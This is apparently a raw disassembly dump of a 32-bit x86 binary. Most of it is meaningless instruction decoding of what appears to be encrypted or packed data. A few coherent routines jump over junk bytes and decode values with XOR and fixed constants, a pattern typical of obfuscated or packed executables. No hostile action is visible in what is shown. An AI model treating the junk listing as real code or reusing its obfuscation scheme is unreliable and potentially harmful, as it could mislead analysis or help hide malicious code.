  410849:	(bad)  
  41084a:	mov    ecx,0x4cb96421
  41084f:	addr16 loope 0x410810
  410852:	in     eax,0x3d
  410854:	push   ss
  410855:	cwde   
  410856:	push   edx
  410857:	outs   dx,DWORD PTR ds:[esi]
  410858:	ror    DWORD PTR [ebx+0x7e757785],1
  41085e:	adc    eax,0x5e566e9d
  410863:	mov    esi,0x4fbd76fe
  410868:	in     eax,dx
  410869:	pop    es
  41086a:	or     eax,0xc3b4bc4c
  41086f:	xchg   esi,eax
  410870:	outs   dx,BYTE PTR ds:[esi]
  410871:	adc    esi,DWORD PTR [esi-0x42]
  410874:	loop   0x41083f
  410876:	retf   
  410877:	out    dx,al
  410878:	pop    ss
  410879:	cdq    
  41087a:	or     al,0x41
  41087c:	int3   
  41087d:	inc    edx
  41087f:	clc    
  410880:	lock push 0xffffff91
  410883:	xchg   esi,eax
  410884:	not    DWORD PTR [edx-0x1efef6f3]
  41088a:	je     0x410837
  41088c:	dec    eax
  41088d:	aad    0x15
  41088f:	jp     0x4108bb
  410891:	xor    edi,DWORD PTR [ebp-0x13]
  410894:	int    0xc3
  410896:	or     dh,ch
  410898:	stc    
  410899:	out    dx,eax
  41089a:	sbb    dl,BYTE PTR [eax]
  41089c:	sar    DWORD PTR [ebx-0x2c],cl
  41089f:	ds out 0x84,al
  4108a2:	sub    BYTE PTR ds:0xa5411291,ah
  4108a8:	inc    edi
  4108a9:	stos   BYTE PTR es:[edi],al
  4108aa:	mov    edi,DWORD PTR [ecx]
  4108ac:	cmp    eax,0xbd176013
  4108b1:	fcom   QWORD PTR ds:0x166186cf
  4108b7:	cwde   
  4108b8:	mov    ds:0xab2cf301,al
  4108bd:	xchg   edi,eax
  4108be:	pushf  
  4108bf:	in     eax,0x4f
  4108c1:	retf   
  4108c2:	adc    BYTE PTR [edi+eiz*8],0x4f
  4108c6:	mov    ds:0xfea48ce8,eax
  4108cb:	push   ds
  4108cc:	push   es
  4108cd:	ret    
  4108ce:	mov    ebp,0x33e66d35
  4108d3:	mov    esi,?
  4108d5:	or     bl,BYTE PTR [edi+0x367ed7ed]
  4108db:	add    bl,BYTE PTR [ecx-0x4c]
  4108de:	jge    0x41087d
  4108e0:	imul   esi,eax,0x4bf1ebac
  4108e6:	add    bh,BYTE PTR gs:[ebp-0x21]
  4108ea:	push   ebx
  4108eb:	push   ecx
  4108ec:	adc    eax,0x2221f4d3
  4108f1:	imul   eax,DWORD PTR [esi],0x39
  4108f4:	add    ebp,esi
  4108f6:	jecxz  0x41094e
  4108f8:	sahf   
  4108f9:	push   cs
  4108fa:	push   ss
  4108fb:	cmc    
  4108fc:	xor    eax,DWORD PTR [eax+eax*1]
  4108ff:	daa    
  410900:	push   esp
  410901:	mov    ds:0x810be3a5,eax
  410906:	scas   al,BYTE PTR es:[edi]
  410907:	test   edi,eax
  410909:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41090a:	in     al,dx
  41090b:	mov    bl,0x7f
  41090d:	ficomp DWORD PTR [edi+edi*2+0x571ef9c2]
  410914:	js     0x410915
  410916:	or     esp,DWORD PTR [edi]
  410918:	xor    esp,0x13330809
  41091e:	pop    ecx
  41091f:	ins    DWORD PTR es:[edi],dx
  410920:	mul    BYTE PTR [edi+ecx*1-0x7452ec5b]
  410927:	je     0x410973
  410929:	or     DWORD PTR [ebp+0x3f],edx
  41092c:	push   0x27
  41092e:	pop    es
  41092f:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410931:	mov    esp,cs
  410933:	aad    0xfa
  410935:	ret    
  410936:	inc    eax
  410937:	adc    eax,0x6c21a3ea
  41093c:	fsub   QWORD PTR [ebx+eiz*4]
  41093f:	push   ss
  410940:	and    BYTE PTR ds:0x96870c36,dl
  410946:	jge    0x41094f
  410948:	test   DWORD PTR [edx-0x4fd02b05],0x35b452cc
  410952:	je     0x41099a
  410954:	dec    esi
  410955:	lock mov bh,0x8
  410958:	dec    edi
  410959:	jmp    0x6d695270
  41095e:	jmp    0x2d09:0xd3e51534
  410965:	pop    esi
  410966:	lods   al,BYTE PTR ds:[esi]
  410967:	add    esp,ecx
  410969:	std    
  41096a:	(bad)  
  41096b:	inc    ecx
  41096c:	fwait
  41096d:	mov    al,ds:0xe1b67585
  410972:	out    dx,eax
  410973:	jp     0x4109b8
  410975:	jno    0x4109a2
  410977:	(bad)  
  410978:	mov    ebx,0xb1ffbc1b
  41097d:	sbb    bl,BYTE PTR [ecx-0x39af5b09]
  410983:	into   
  410984:	shl    dl,cl
  410986:	mov    ch,0xa8
  410988:	call   0x60a1ab7
  41098d:	add    DWORD PTR [eax+0x331f72f6],ebx
  410993:	stos   BYTE PTR es:[edi],al
  410994:	call   0x2d6e:0xd68bfb11
  41099b:	jbe    0x4109f2
  41099d:	dec    BYTE PTR [edi]
  41099f:	xlat   BYTE PTR ds:[ebx]
  4109a0:	nop
  4109a1:	test   DWORD PTR [esi-0xa],esp
  4109a4:	sbb    eax,0x49eb4b14
  4109a9:	jle    0x41097c
  4109ab:	xor    eax,0x861ce7dc
  4109b0:	xor    eax,0x6c4f3019
  4109b5:	mov    eax,ds:0x71781fb4
  4109ba:	add    DWORD PTR [ebx+0x7e],eax
  4109bd:	inc    esp
  4109be:	pop    ebx
  4109bf:	call   0x9636aa7b
  4109c4:	add    eax,0xb1f590e3
  4109c9:	xchg   DWORD PTR [esi-0xbfdbcca],edx
  4109cf:	dec    esi
  4109d0:	or     eax,0x1c1c7ebc
  4109d5:	jg     0x4109f1
  4109d7:	jae    0x410a44
  4109d9:	lea    ebp,[edx+0x56]
  4109dc:	cmp    eax,0x938c965
  4109e1:	cmp    esi,DWORD PTR [ecx+0x58cd6600]
  4109e7:	jo     0x4109a3
  4109e9:	lock mov bl,0xe2
  4109ec:	aam    0xd1
  4109ee:	push   ebp
  4109ef:	mov    dl,0x91
  4109f1:	add    BYTE PTR [edi-0x218b206f],dl
  4109f7:	das    
  4109f8:	pop    ebp
  4109f9:	sbb    DWORD PTR [esi],0x2a795b0e
  4109ff:	inc    eax
  410a00:	fsubr  DWORD PTR [esi+0x53]
  410a03:	cmc    
  410a04:	lea    ebx,[edi+0x2c71db88]
  410a0a:	(bad)  [edx+0x4]
  410a0d:	pop    ebp
  410a0e:	or     eax,0x4a103631
  410a13:	jbe    0x410a85
  410a15:	push   esi
  410a16:	push   edx
  410a17:	leave  
  410a18:	div    bh
  410a1a:	pop    ecx
  410a1b:	test   BYTE PTR ds:0x59f1c348,ch
  410a21:	jecxz  0x4109cb
  410a23:	std    
  410a24:	fistp  QWORD PTR [edx]
  410a26:	sahf   
  410a27:	nop
  410a28:	jns    0x410a4e
  410a2a:	jno    0x410a8a
  410a2c:	add    DWORD PTR [edi+0x5dc8f5ba],0xffffffc7
  410a33:	jle    0x4109b7
  410a35:	ret    
  410a36:	cmp    BYTE PTR [esi+esi*4+0x53],cl
  410a3a:	jbe    0x4109bf
  410a3c:	jb     0x410a2f
  410a3e:	idiv   DWORD PTR [edi-0x65]
  410a41:	fdiv   st(1),st
  410a43:	loope  0x410a03
  410a45:	aas    
  410a46:	and    dh,BYTE PTR [ecx]
  410a48:	ds push esp
  410a4a:	mov    ecx,0x94aab3eb
  410a4f:	mov    esi,DWORD PTR [esi-0x1a]
  410a52:	arpl   dx,ax
  410a54:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410a55:	leave  
  410a56:	rcl    BYTE PTR [ecx+edx*1-0x38],cl
  410a5a:	sub    al,0x1a
  410a5c:	push   0xffffff99
  410a5e:	inc    ebp
  410a5f:	xor    esp,DWORD PTR [edx+0x6f]
  410a62:	mov    dl,0x1d
  410a64:	sahf   
  410a65:	inc    BYTE PTR [eax]
  410a67:	cmp    DWORD PTR [ebx-0x12f1c094],0xffffffd4
  410a6e:	jae    0x410a2b
  410a70:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410a71:	sti    
  410a72:	les    edi,FWORD PTR [ebp-0x71]
  410a75:	mov    edi,0x3b3886af
  410a7a:	mov    ds:0xa7ff2ee1,eax
  410a7f:	or     ebp,ebx
  410a81:	fcmovnbe st,st(3)
  410a83:	lds    esi,FWORD PTR [edx+0x3a84133b]
  410a89:	ds cmp al,0xb1
  410a8c:	dec    bl
  410a8e:	rcr    BYTE PTR [edi+0x6d275a97],1
  410a94:	xor    DWORD PTR [esi-0x4c],eax
  410a97:	mov    ch,0xa7
  410a99:	aam    0xd9
  410a9b:	fdiv   QWORD PTR [eax+0x1c]
  410a9e:	jecxz  0x410a22
  410aa0:	push   ecx
  410aa1:	stos   BYTE PTR es:[edi],al
  410aa2:	push   eax
  410aa3:	pop    es
  410aa4:	(bad)  
  410aa5:	add    edx,ebp
  410aa7:	mov    ds:0xdd0c73a7,eax
  410aac:	inc    ebx
  410aad:	or     al,0xae
  410aaf:	retf   0xb24b
  410ab2:	xor    DWORD PTR [esi-0x2d0f053e],0x8be5bc3c
  410abc:	loope  0x410aa4
  410abe:	mov    bh,0xc7
  410ac0:	jno    0x410a65
  410ac2:	popf   
  410ac3:	(bad)  
  410ac5:	hlt    
  410ac6:	bound  ebx,QWORD PTR [eax-0x3d]
  410ac9:	ins    BYTE PTR es:[edi],dx
  410aca:	test   DWORD PTR [ebx],edx
  410acc:	out    dx,al
  410acd:	fist   DWORD PTR [ebx-0x73a21a41]
  410ad3:	dec    ebp
  410ad4:	fistp  QWORD PTR [esi-0x3a9aad71]
  410ada:	xchg   ecx,eax
  410adb:	cmp    eax,0xf252968b
  410ae0:	jns    0x410b4d
  410ae2:	jnp    0x410a7e
  410ae4:	jb     0x410af1
  410ae6:	add    BYTE PTR ds:0x7ee05ebb,al
  410aec:	cmp    DWORD PTR [ebp-0x30],esi
  410aef:	mov    ebx,0x35bfd4ae
  410af4:	imul   ecx,DWORD PTR [esi],0xffffffe9
  410af7:	retf   
  410af8:	pop    edx
  410af9:	scas   eax,DWORD PTR es:[edi]
  410afa:	lods   al,BYTE PTR ds:[esi]
  410afb:	or     BYTE PTR es:[esi-0x39],bl
  410aff:	mov    ebx,0x5cdd8990
  410b04:	or     esi,0xffffff8f
  410b07:	mov    al,0xc7
  410b09:	mov    cs,WORD PTR [ecx+eax*4-0x36]
  410b0d:	sbb    ecx,DWORD PTR [ecx]
  410b0f:	bound  esi,QWORD PTR fs:[edi+0x37522cd8]
  410b16:	cmp    al,0x65
  410b18:	fdivr  DWORD PTR [eax]
  410b1a:	es push 0xffffffda
  410b1d:	or     ch,BYTE PTR [ecx+0x4e7ab063]
  410b23:	lods   eax,DWORD PTR ds:[esi]
  410b24:	add    al,0xf
  410b26:	jnp    0x410abb
  410b28:	call   0x5348:0xc6010624
  410b2f:	fnstcw WORD PTR [eax-0x5153630d]
  410b35:	int3   
  410b36:	lods   eax,DWORD PTR ds:[esi]
  410b37:	xchg   ebp,eax
  410b38:	fs pop edx
  410b3a:	popf   
  410b3b:	jle    0x410b97
  410b3d:	fld    QWORD PTR [eax+ebp*1-0x17]
  410b41:	cld    
  410b42:	ror    BYTE PTR [ecx],0xd3
  410b45:	mov    esp,0x99b8f099
  410b4a:	adc    al,BYTE PTR [bx+si-0x5dd2]
  410b4f:	stos   BYTE PTR es:[edi],al
  410b50:	inc    esp
  410b51:	mov    fs,WORD PTR [edx+0x38]
  410b54:	adc    DWORD PTR [edi-0x16],edx
  410b57:	loop   0x410b53
  410b59:	xchg   ch,ch
  410b5b:	call   0x670f151b
  410b60:	lock cmp DWORD PTR [esi+0x54],eax
  410b64:	pop    esi
  410b65:	je     0x410b73
  410b6b:	mov    eax,DWORD PTR [ebp+0x8]
  410b6e:	jmp    0x410b8c
  410b73:	mov    eax,DWORD PTR [ebp-0x4]
  410b76:	xor    eax,edx
  410b78:	add    eax,ecx
  410b7a:	jmp    0x410b8c
  410b7f:	mov    eax,DWORD PTR [ebp-0x4]
  410b82:	xor    eax,0x7510855
  410b87:	add    eax,0x32729c
  410b8c:	leave  
  410b8d:	ret    0x4
  410b90:	push   ebp
  410b91:	mov    ebp,esp
  410b93:	jmp    0x410f98
  410b98:	outs   dx,DWORD PTR ds:[esi]
  410b99:	mov    WORD PTR ds:0x7191e994,cs
  410b9f:	jae    0x410bc2
  410ba1:	dec    esi
  410ba2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410ba3:	repz mov ebx,0x3e8e07fe
  410ba9:	inc    edx
  410baa:	jo     0x410c1c
  410bac:	pop    eax
  410bad:	jge    0x410c1f
  410baf:	jo     0x410bef
  410bb1:	jge    0x410b67
  410bb3:	add    al,bl
  410bb5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410bb6:	(bad)  
  410bb7:	lahf   
  410bb8:	sbb    DWORD PTR [ecx],0x22
  410bbb:	adc    BYTE PTR [ebx+eiz*8-0x1c],0xe9
  410bc0:	mov    ch,BYTE PTR [edi+eiz*4]
  410bc3:	dec    ecx
  410bc4:	mov    ebp,0x99b09655
  410bc9:	inc    ebx
  410bca:	mov    esp,0x3566ae70
  410bcf:	enter  0xdf95,0x7a
  410bd3:	sbb    BYTE PTR [ecx+0x2b],ah
  410bd6:	xchg   edx,eax
  410bd7:	mov    ch,0x8f
  410bd9:	cld    
  410bda:	mov    bh,0x6b
  410bdc:	pop    ds
  410bdd:	ss pop eax
  410bdf:	frstor [edi+0x42]
  410be2:	dec    ebx
  410be3:	hlt    
  410be4:	add    al,0x54
  410be6:	imul   esi,DWORD PTR [edx+ecx*1+0xd],0xffffffe0
  410beb:	adc    BYTE PTR [ebx],dh
  410bed:	push   0xfffffffc
  410bef:	xchg   DWORD PTR [ebx],ebp
  410bf1:	jp     0x410c08
  410bf3:	outs   dx,DWORD PTR ds:[esi]
  410bf4:	adc    eax,0xf32c4f47
  410bf9:	shl    DWORD PTR [eax+0x5fe43360],0xfd
  410c00:	imul   esp,DWORD PTR [eax+ebx*1-0x7a],0xffffffe0
  410c05:	mov    WORD PTR [ebx-0xd],ds
  410c08:	fstp   QWORD PTR [si+0xd]
  410c0c:	inc    eax
  410c0d:	int    0xc
  410c0f:	ins    BYTE PTR es:[edi],dx
  410c10:	loope  0x410c83
  410c12:	sub    BYTE PTR [edi-0x1d874bcf],dh
  410c18:	cmp    al,0xe9
  410c1a:	or     BYTE PTR [ecx],dh
  410c1c:	sbb    BYTE PTR [edx-0x5c],dh
  410c1f:	or     ebp,DWORD PTR [edx-0x6]
  410c22:	mov    dl,0x61
  410c24:	loope  0x410c87
  410c26:	mov    DWORD PTR [ecx+eiz*1+0x2c],esp
  410c2a:	in     al,0xac
  410c2c:	push   ds
  410c2d:	xchg   ecx,eax
  410c2e:	sti    
  410c2f:	pusha  
  410c30:	or     edx,edx
  410c32:	mov    edx,0x7fd93d74
  410c37:	cmp    eax,0xb9e190aa
  410c3c:	in     eax,0xa
  410c3e:	jl     0x410c5e
  410c40:	add    eax,0x8c43f9
  410c45:	adc    dh,ch
  410c47:	in     eax,0x66
  410c49:	loopne 0x410c25
  410c4b:	mov    bl,0x6d
  410c4d:	pop    edx
  410c4e:	jb     0x410ca6
  410c50:	add    eax,0x87069819
  410c55:	adc    DWORD PTR [ecx+0x7f],0xcb5a917a
  410c5c:	rcr    BYTE PTR [ebp+0x3c72f33c],cl
  410c62:	retf   0xff24
  410c65:	adc    edi,DWORD PTR ds:0x727b5f3b
  410c6b:	dec    esp
  410c6c:	inc    ebx
  410c6d:	xor    DWORD PTR [edx+ebp*8],ecx
  410c70:	shl    BYTE PTR [edx+0x22],0xeb
  410c74:	cli    
  410c75:	cmp    eax,0xb0f9ece3
  410c7a:	push   ebp
  410c7b:	inc    esi
  410c7c:	xchg   dl,dh
  410c7e:	leave  
  410c7f:	push   ebx
  410c80:	mov    cs,WORD PTR [esi]
  410c82:	pop    edx
  410c83:	popf   
  410c84:	and    ebx,0xce1fc93a
  410c8a:	stos   BYTE PTR es:[edi],al
  410c8b:	adc    BYTE PTR ds:0xebaee529,dl
  410c91:	stos   BYTE PTR es:[edi],al
  410c92:	add    ch,ah
  410c94:	or     cl,ah
  410c96:	mov    ch,0x94
  410c98:	repz sbb BYTE PTR [edx+0x38],dh
  410c9c:	push   ecx
  410c9d:	in     al,0xcc
  410c9f:	and    BYTE PTR [eax+0x6a59acb],ah
  410ca5:	sbb    ebx,ecx
  410ca7:	out    dx,eax
  410ca8:	dec    esp
  410ca9:	jle    0x410c46
  410cab:	in     al,dx
  410cac:	les    edi,FWORD PTR [edx+0x61]
  410caf:	sbb    ch,BYTE PTR [edx]
  410cb1:	jns    0x410c41
  410cb3:	mov    esp,0x90e182ad
  410cb8:	ds int 0x7a
  410cbb:	je     0x410d0b
  410cbd:	adc    dl,BYTE PTR [esi+0x1e]
  410cc0:	sbb    ch,bh
  410cc2:	pop    ebx
  410cc3:	mov    DWORD PTR [eax+0x5fa291f8],ecx
  410cc9:	adc    al,0xee
  410ccb:	bound  eax,QWORD PTR [esi-0x48]
  410cce:	push   0x15
  410cd0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410cd2:	or     ecx,DWORD PTR ds:0xc210bd48
  410cd8:	add    ecx,ebp
  410cda:	jne    0x410cc5
  410cdc:	pop    esi
  410cdd:	out    0x2e,al
  410cdf:	dec    ebx
  410ce0:	fcmovbe st,st(3)
  410ce2:	fldcw  WORD PTR [ebx+0x47]
  410ce5:	push   cs
  410ce6:	or     eax,0x8bd9c2d
  410ceb:	xchg   ecx,eax
  410cec:	shl    BYTE PTR [edx-0x36417ebc],0xdf
  410cf3:	(bad)  
  410cf4:	jmp    0x410cba
  410cf6:	stc    
  410cf7:	cld    
  410cf8:	ja     0x410d6b
  410cfa:	fdiv   DWORD PTR [edi-0xb70461e]
  410d00:	inc    edx
  410d01:	call   0x8e31b9b
  410d06:	nop
  410d07:	xchg   ebx,eax
  410d08:	mov    esi,0xb332fe14
  410d0d:	addr16 pop es
  410d0f:	inc    edi
  410d10:	cmp    eax,DWORD PTR [ecx-0x688e80d3]
  410d16:	inc    eax
  410d17:	outs   dx,BYTE PTR ds:[esi]
  410d18:	add    al,0xbe
  410d1a:	pop    ss
  410d1b:	and    al,0x93
  410d1d:	(bad)  
  410d1e:	lods   eax,DWORD PTR ds:[esi]
  410d1f:	push   ss
  410d20:	arpl   WORD PTR [edi],cx
  410d22:	xchg   ebx,eax
  410d23:	daa    
  410d24:	xor    al,0xb5
  410d26:	lds    edx,FWORD PTR [ebx]
  410d28:	mov    dl,0x3d
  410d2a:	xor    eax,0x3d6d8f26
  410d2f:	inc    edi
  410d30:	dec    esi
  410d31:	jns    0x410d4d
  410d33:	push   ebp
  410d34:	xor    ecx,DWORD PTR [edi+0x1c]
  410d37:	dec    ebx
  410d38:	adc    ebp,DWORD PTR [ebx+edi*2+0x15]
  410d3c:	cmp    al,0x9a
  410d3e:	arpl   WORD PTR [eax],sp
  410d40:	sbb    BYTE PTR [esi-0x2a],al
  410d43:	fimul  DWORD PTR [ebx+0x6]
  410d46:	aaa    
  410d47:	sbb    BYTE PTR [eax+0x2a1fffa1],dh
  410d4d:	mov    ds:0xe5bfec49,al
  410d52:	jl     0x410d04
  410d54:	cmp    al,0xfd
  410d56:	test   al,0x27
  410d58:	stos   BYTE PTR es:[edi],al
  410d59:	sub    al,0x36
  410d5b:	pop    edx
  410d5c:	retf   0xb455
  410d5f:	inc    edx
  410d60:	rcl    ecx,cl
  410d62:	stc    
  410d63:	mov    ecx,0x26b9e2ad
  410d68:	dec    ebx
  410d69:	and    edi,edi
  410d6b:	repz stc 
  410d6d:	push   edx
  410d6e:	or     BYTE PTR [ebp-0x54f91efe],bl
  410d74:	cmp    al,0x18
  410d76:	pushf  
  410d77:	push   edx
  410d78:	call   0xe015:0xa3c77fd9
  410d7f:	dec    edi
  410d80:	push   0xffffffca
  410d82:	gs pop ecx
  410d84:	push   DWORD PTR [edx+ebp*1+0x67640a09]
  410d8b:	fwait
  410d8c:	pop    edi
  410d8d:	push   ebp
  410d8e:	cmp    edi,esp
  410d90:	and    DWORD PTR [edx],eax
  410d92:	dec    edx
  410d93:	repnz xor BYTE PTR [edx],dl
  410d96:	scas   al,BYTE PTR es:[edi]
  410d97:	adc    BYTE PTR [edx+0x6],ah
  410d9a:	jno    0x410da3
  410d9c:	cmp    esp,DWORD PTR [edx+0x13]
  410d9f:	xor    ah,cl
  410da1:	(bad)  
  410da2:	mov    dh,0xf
  410da4:	stos   DWORD PTR es:[edi],eax
  410da5:	mov    BYTE PTR [edi+edi*2],dl
  410da8:	js     0x410de8
  410daa:	add    dl,BYTE PTR [esi]
  410dac:	pop    edi
  410dad:	add    al,0x18
  410daf:	jge    0x410d64
  410db1:	call   0xc5bc:0x2be633a0
  410db8:	ror    al,cl
  410dba:	xchg   esp,eax
  410dbb:	add    eax,DWORD PTR [ecx-0x344530e5]
  410dc1:	repz (bad)
  410dc4:	imul   ebp,ecx,0x9f48be14
  410dca:	or     al,BYTE PTR [edi]
  410dcc:	mov    ds:0x8823da6a,eax
  410dd1:	dec    edi
  410dd2:	lds    edi,FWORD PTR [edx+ecx*1-0x1a]
  410dd6:	cwde   
  410dd7:	or     edx,edx
  410dd9:	dec    esi
  410dda:	jae    0x410e3a
  410ddc:	inc    esi
  410ddd:	call   0x450987f
  410de2:	fld    DWORD PTR [ebx-0x38084cdd]
  410de8:	and    eax,0x190c5676
  410ded:	mov    ebp,0x3de6b205
  410df2:	enter  0xa2f0,0xf0
  410df6:	push   cs
  410df7:	push   0x1baf2787
  410dfc:	or     dl,BYTE PTR [ecx]
  410dfe:	aas    
  410dff:	shl    BYTE PTR [eax],0x33
  410e02:	cmp    eax,0xabafc596
  410e07:	push   esp
  410e08:	mov    DWORD PTR [ebp-0x36],ebp
  410e0b:	sub    eax,0xbadee8d5
  410e10:	pop    eax
  410e11:	dec    edx
  410e12:	fcmove st,st(0)
  410e14:	imul   ecx,DWORD PTR [ecx+0x6ca36cd5],0xc2b42e4
  410e1e:	aas    
  410e1f:	scas   al,BYTE PTR es:[edi]
  410e20:	inc    ebx
  410e21:	dec    edx
  410e22:	xor    al,0x7c
  410e24:	sbb    DWORD PTR [esi-0x59],ebp
  410e27:	push   es
  410e28:	imul   edx,DWORD PTR [ebx],0x62f3e7a9
  410e2e:	les    edx,FWORD PTR [esp+ecx*1-0x494c1733]
  410e35:	mov    dl,0xe1
  410e37:	fwait
  410e38:	cli    
  410e39:	fisttp WORD PTR [edx]
  410e3b:	add    DWORD PTR [ecx-0x63],ebx
  410e3e:	dec    ebx
  410e3f:	dec    eax
  410e40:	nop
  410e41:	lods   eax,DWORD PTR ds:[esi]
  410e42:	imul   edx,DWORD PTR [eax-0x5b],0xffffffa4
  410e46:	stc    
  410e47:	je     0x410e1c
  410e49:	je     0x410e1a
  410e4b:	jge    0x410dcf
  410e4d:	pusha  
  410e4e:	aam    0x46
  410e50:	jmp    0xca7bf1c3
  410e55:	shl    DWORD PTR [ecx],1
  410e57:	pushf  
  410e58:	pop    ebx
  410e59:	mov    edi,0xdd190d4
  410e5e:	shr    DWORD PTR [ecx-0x1e],0x91
  410e62:	mov    dl,0xd
  410e64:	cmp    DWORD PTR [edi],0x51
  410e67:	xor    DWORD PTR [edx],esi
  410e69:	mov    cs,WORD PTR [esi+0x76]
  410e6c:	inc    eax
  410e6d:	aaa    
  410e6e:	arpl   sp,ax
  410e70:	pop    ecx
  410e71:	sbb    al,0x49
  410e73:	xchg   edx,eax
  410e74:	or     dl,BYTE PTR [ecx+0x22c0ec92]
  410e7a:	and    bl,bl
  410e7c:	mov    ecx,0x40c282b4
  410e81:	mov    al,ds:0xbcfe41e7
  410e86:	mov    ah,0xaa
  410e88:	vmread DWORD PTR [edx],ecx
  410e8b:	into   
  410e8c:	sub    eax,0x748ac924
  410e91:	jae    0x410e15
  410e93:	mov    fs,esp
  410e95:	mov    ecx,DWORD PTR [edi]
  410e97:	ror    DWORD PTR ds:0x2ff08c10,0xe6
  410e9e:	push   ss
  410e9f:	outs   dx,DWORD PTR ds:[esi]
  410ea0:	(bad)  
  410ea2:	or     BYTE PTR [edx-0xd],ah
  410ea5:	inc    ecx
  410ea6:	test   eax,0x62f39e43
  410eab:	je     0x410ec4
  410ead:	dec    edx
  410eae:	xchg   BYTE PTR [ebp-0x71],dl
  410eb1:	data16 jp 0x410e78
  410eb4:	es push esi
  410eb6:	dec    esi
  410eb7:	es ret 
  410eb9:	inc    esi
  410eba:	add    DWORD PTR [edi],0xffffff98
  410ebd:	push   ecx
  410ebe:	fiadd  WORD PTR [edx-0x3e4ecff4]
  410ec4:	mov    eax,0xcaa18694
  410ec9:	loope  0x410ee9
  410ecb:	mov    ss,WORD PTR [ebx+0x40]
  410ece:	sahf   
  410ecf:	retf   
  410ed0:	xor    esp,DWORD PTR [esi-0x1d]
  410ed3:	cmp    ah,cl
  410ed5:	lds    eax,FWORD PTR ds:0x9f74dd5f
  410edb:	fdivrp st(4),st
  410edd:	adc    al,BYTE PTR [edx+esi*8+0x3b]
  410ee1:	in     al,dx
  410ee2:	test   BYTE PTR [esi-0x15fca37],cl
  410ee8:	test   eax,0x158ba45e
  410eed:	and    bh,BYTE PTR ds:0x15d38070
  410ef3:	inc    ebp
  410ef4:	push   eax
  410ef5:	loopne 0x410ec9
  410ef7:	mov    eax,DWORD PTR [ebx+ecx*1-0xad5530e]
  410efe:	mov    ebx,0x385868c1
  410f03:	cmp    eax,0xb8a81ee7
  410f08:	addr16 mov ch,0x92
  410f0b:	dec    esi
  410f0c:	xchg   ebx,eax
  410f0d:	je     0x410f24
  410f0f:	nop
  410f10:	aam    0xbe
  410f12:	nop
  410f13:	test   al,0x80
  410f15:	and    eax,DWORD PTR [ebx]
  410f17:	cmp    dh,BYTE PTR [ecx]
  410f19:	mov    dh,0x66
  410f1b:	rcl    BYTE PTR [ecx+0x1e],cl
  410f1e:	sub    dh,BYTE PTR [ebp-0x1b]
  410f21:	repz dec ecx
  410f23:	repz cdq 
  410f25:	inc    ebp
  410f26:	jp     0x410ef6
  410f28:	and    al,BYTE PTR [edx-0x4b]
  410f2b:	and    ch,dh
  410f2d:	jne    0x410f79
  410f2f:	aad    0xd7
  410f31:	xor    ecx,DWORD PTR [eax+0x6506597c]
  410f37:	jp     0x410efe
  410f39:	pop    esi
  410f3a:	je     0x410f8b
  410f3c:	mov    ecx,0x634f2c4f
  410f41:	mov    DWORD PTR [esi+0x5d],edx
  410f44:	rol    BYTE PTR [ebx-0x42],0x9
  410f48:	dec    esi
  410f49:	ret    0x7440
  410f4c:	mov    ah,0x2c
  410f4e:	(bad)  
  410f4f:	in     eax,dx
  410f50:	push   ebx
  410f51:	mov    al,0xd
  410f53:	and    al,0x34
  410f55:	int3   
  410f56:	lods   eax,DWORD PTR ds:[esi]
  410f57:	stos   BYTE PTR es:[edi],al
  410f58:	sahf   
  410f59:	repnz add al,0x4e
  410f5c:	ror    BYTE PTR [ebp+0x42],1
  410f5f:	cdq    
  410f60:	ret    0xdb96
  410f63:	mov    ds:0xc618fa4f,al
  410f68:	jge    0x410fdb
  410f6a:	jnp    0x410f83
  410f6c:	fnstenv [eax-0x2eddc010]
  410f72:	push   ebp
  410f73:	sub    eax,0x56e3b7e3
  410f78:	push   es
  410f79:	add    eax,0x3ec1873f
  410f7e:	mov    edx,0xbbedc2ed
  410f83:	or     eax,0x274363e5
  410f88:	pop    edi
  410f89:	fwait
  410f8a:	rol    cl,0xe2
  410f8d:	push   edi
  410f8e:	sahf   
  410f8f:	or     eax,0xc771320d
  410f94:	dec    eax
  410f95:	(bad)  [ebx+0x5]
  410f98:	mov    eax,ds:0x41b22c
  410f9d:	mov    edx,0x32729c
  410fa2:	sub    eax,edx
  410fa4:	adc    DWORD PTR ds:0x42fd6e,ebx
  410faa:	mov    ecx,0x7510855
  410faf:	push   esi
  410fb0:	mov    esi,DWORD PTR [ebp+0xc]
  410fb3:	xor    eax,ecx
  410fb5:	mov    DWORD PTR ds:0x42e11c,0x4b31
  410fbf:	jmp    0x4113c4
  410fc4:	xchg   edx,eax
  410fc5:	shl    DWORD PTR [edi+eiz*8+0x71516771],cl
  410fcc:	push   ebp
  410fcd:	paddsw mm6,QWORD PTR [eax-0x1f287d60]
  410fd4:	es dec esi
  410fd6:	jo     0x411048
  410fd8:	pop    eax
  410fd9:	jge    0x41104b
  410fdb:	jo     0x410fe9
  410fdd:	out    dx,eax
  410fde:	dec    ebx
  410fdf:	adc    edx,DWORD PTR [ecx]
  410fe1:	(bad)  
  410fe2:	and    eax,0x738c37de
  410fe7:	and    cl,BYTE PTR [ebp+0x25b66391]
  410fed:	add    eax,0x8edc1768
  410ff2:	mov    esi,0x5e694294
  410ff7:	ret    0xed20
  410ffa:	dec    ecx
  410ffb:	call   0xf5041fdf
  411000:	cmp    al,0xa4
  411002:	(bad)
  411006:	arpl   WORD PTR [ebx+eax*1+0x30],bx
  41100a:	xor    eax,0xd7a1b3e0
  41100f:	out    dx,eax
  411010:	jno    0x411011
  411012:	cli    
  411013:	add    ebx,DWORD PTR [eax+0x62]
  411016:	jne    0x41100f
  411018:	jmp    0x5074:0x5d715bf6
  41101f:	jmp    0xe7d1045
  411024:	inc    ecx
  411025:	out    0x66,eax
  411027:	ja     0x410fe4
  411029:	iret   
  41102a:	xlat   BYTE PTR ds:[ebx]
  41102b:	adc    BYTE PTR [ebx+0x2580e1f8],0x57
  411032:	mov    esi,0xb2a16bf6
  411037:	mov    al,ds:0xef9d5204
  41103c:	(bad)  
  41103d:	push   esp
  41103e:	adc    esi,DWORD PTR [edi-0xec16c72]
  411044:	sbb    edi,DWORD PTR [ebx+0x4591214]
  41104a:	ins    BYTE PTR es:[edi],dx
  41104b:	out    0x62,eax
  41104d:	push   esp
  41104e:	xor    cl,al
